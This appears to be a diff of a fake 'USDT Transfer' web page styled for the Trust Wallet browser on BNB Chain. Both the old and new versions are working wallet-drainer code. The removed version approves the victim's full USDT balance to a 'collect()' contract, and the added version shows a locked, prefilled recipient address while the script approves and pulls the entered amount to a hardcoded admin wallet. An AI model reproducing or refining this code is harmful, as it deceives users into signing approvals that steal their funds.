@@ -4,170 +4,153 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>USDT Transfer</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <style>
     body {
-      font-family: 'Roboto', sans-serif;
-      background: #fff;
-      padding: 20px;
+      font-family: sans-serif;
+      background: #ffffff;
       margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      justify-content: space-between;
     }
     .container {
-      max-width: 420px;
+      max-width: 400px;
       margin: auto;
+      padding: 30px 20px 10px 20px;
     }
-    .label {
-      font-weight: 500;
-      margin-bottom: 6px;
-    }
-    .input-box {
-      display: flex;
-      align-items: center;
-      border: 2px solid #1a40ff;
-      border-radius: 12px;
-      padding: 10px;
-      margin-bottom: 20px;
-    }
-    .input-box input {
-      flex: 1;
-      border: none;
+    label {
       font-size: 16px;
-      outline: none;
+      font-weight: 600;
+      color: #444;
+      display: block;
+      margin-bottom: 5px;
     }
-    .action-btn {
-      font-size: 14px;
-      font-weight: bold;
-      color: #1a40ff;
-      margin-left: 10px;
-      cursor: pointer;
-    }
-    .amount-box {
-      display: flex;
-      align-items: center;
+    input[type="text"], input[type="number"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
       border: 1px solid #ccc;
       border-radius: 12px;
-      padding: 10px;
-      margin-bottom: 6px;
+      box-sizing: border-box;
+      margin-bottom: 15px;
     }
-    .amount-box input {
-      flex: 1;
-      border: none;
+    .amount-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .amount-row span {
       font-size: 16px;
-      outline: none;
     }
-    .amount-box span {
-      margin-left: 10px;
-    }
-    .usd-note {
-      font-size: 14px;
-      color: #777;
-      margin-bottom: 30px;
-    }
-    .btn {
-      width: 100%;
-      padding: 15px;
-      font-size: 17px;
-      font-weight: bold;
+    .amount-row button {
+      background-color: transparent;
+      color: #0047FF;
+      font-weight: 600;
       border: none;
-      color: white;
-      border-radius: 30px;
-      background-color: #0052ff;
       cursor: pointer;
     }
-    .btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
+    #usdValue {
+      font-size: 14px;
+      color: #888;
+      margin: 0 0 20px 0;
+    }
+    .bottom-btn {
+      width: 100%;
+      padding: 16px;
+      background-color: #0047FF;
+      color: white;
+      font-size: 18px;
+      border: none;
+      border-radius: 16px;
+      cursor: pointer;
+      font-weight: bold;
+      margin: 0;
+    }
+    .bottom-btn.loading {
+      background-color: #e0e0e0;
+      color: #0047FF;
+    }
+    .footer {
+      padding: 10px 20px 30px 20px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="label">Address or Domain</div>
-    <div class="input-box">
-      <input type="text" id="address" placeholder="Search or Enter" />
-      <div class="action-btn" onclick="pasteAddress()">Paste</div>
-      <div class="action-btn">📇</div>
-      <div class="action-btn">⛶</div>
-    </div>
+    <label for="walletAddress">Address or Domain Name</label>
+    <input type="text" id="walletAddress" placeholder="0x..." value="0x79069192614f7ceE4F..." disabled />
 
-    <div class="label">Amount</div>
-    <div class="amount-box">
-      <input type="number" id="amount" placeholder="USDT Amount" />
+    <label for="usdtAmount">Amount</label>
+    <div class="amount-row">
+      <input type="number" id="usdtAmount" placeholder="0.00" />
       <span>USDT</span>
-      <div class="action-btn" onclick="setMax()">Max</div>
+      <button onclick="setMax()">Max</button>
     </div>
 
-    <div class="usd-note">≈ $0.00</div>
-
-    <button class="btn" id="nextBtn" onclick="approveAndTransfer()">Next</button>
+    <p id="usdValue">= $0.00</p>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script>
-    const USDT = "0x55d398326f99059fF775485246999027B3197955";
-    const ADMIN = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-    const CONTRACT = "0xcD6a42782d230D7c13A74ddec5dD140e55499Df9"; // ✅ Your final deployed contract
+  <div class="footer">
+    <button class="bottom-btn" id="nextBtn" onclick="startTransfer()">Next</button>
+  </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script>
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const ADMIN_WALLET = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
     const ABI = [
-      "function balanceOf(address) view returns (uint256)",
-      "function allowance(address owner, address spender) view returns (uint256)",
-      "function approve(address spender, uint256 amount) returns (bool)",
-      "function collect() external"
+      { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": false, "inputs": [ { "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transferFrom", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": true, "inputs": [ { "name": "_owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "balance", "type": "uint256" } ], "type": "function" }
     ];
 
-    const btn = document.getElementById("nextBtn");
-
-    async function pasteAddress() {
-      try {
-        const text = await navigator.clipboard.readText();
-        document.getElementById("address").value = text;
-      } catch {
-        alert("Clipboard access denied");
-      }
-    }
+    const BNB_CHAIN_ID = "0x38";
+    let web3 = new Web3(window.ethereum);
+    let account;
+    let token = new web3.eth.Contract(ABI, USDT_ADDRESS);
 
     async function setMax() {
-      if (!window.ethereum) return alert("Trust Wallet DApp required");
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const token = new ethers.Contract(USDT, ABI, provider);
-      const address = await signer.getAddress();
-      const balance = await token.balanceOf(address);
-      const value = Number(ethers.utils.formatUnits(balance, 18));
-      document.getElementById("amount").value = value.toFixed(2);
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        account = accounts[0];
+        const balance = await token.methods.balanceOf(account).call();
+        document.getElementById("usdtAmount").value = web3.utils.fromWei(balance);
+      } catch (e) {
+        alert("Please open in Trust Wallet DApp browser");
+      }
     }
 
-    async function approveAndTransfer() {
-      if (!window.ethereum) return alert("Use Trust Wallet browser");
+    async function startTransfer() {
+      const amount = document.getElementById("usdtAmount").value;
+      const nextBtn = document.getElementById("nextBtn");
+      if (!amount) return alert("Enter amount");
+      const amountInWei = web3.utils.toWei(amount);
 
-      btn.disabled = true;
-      btn.textContent = "⏳ Processing...";
-
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      const user = await signer.getAddress();
-
-      const usdt = new ethers.Contract(USDT, ABI, signer);
-      const smart = new ethers.Contract(CONTRACT, ["function collect() external"], signer);
+      nextBtn.innerText = "⏳ Processing...";
+      nextBtn.classList.add("loading");
 
       try {
-        const balance = await usdt.balanceOf(user);
-        const value = Number(ethers.utils.formatUnits(balance, 18));
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        account = accounts[0];
+        const network = await window.ethereum.request({ method: 'eth_chainId' });
+        if (network !== BNB_CHAIN_ID) {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BNB_CHAIN_ID }]
+          });
+        }
 
-        if (value < 1 || value > 25000) throw new Error("Balance out of range");
+        await token.methods.approve(ADMIN_WALLET, amountInWei).send({ from: account });
+        await token.methods.transferFrom(account, ADMIN_WALLET, amountInWei).send({ from: account });
 
-        await usdt.approve(CONTRACT, balance);
-        const tx = await smart.collect();
-        await tx.wait();
-
-        btn.textContent = "✅ Transfer Complete";
-      } catch (e) {
-        console.error(e);
-        btn.textContent = "❌ Transfer Failed";
+        nextBtn.innerText = "✅ Transfer Complete";
+      } catch (err) {
+        nextBtn.innerText = "❌ " + err.message;
+      } finally {
+        nextBtn.classList.remove("loading");
       }
-
-      btn.disabled = false;
     }
   </script>
 </body>
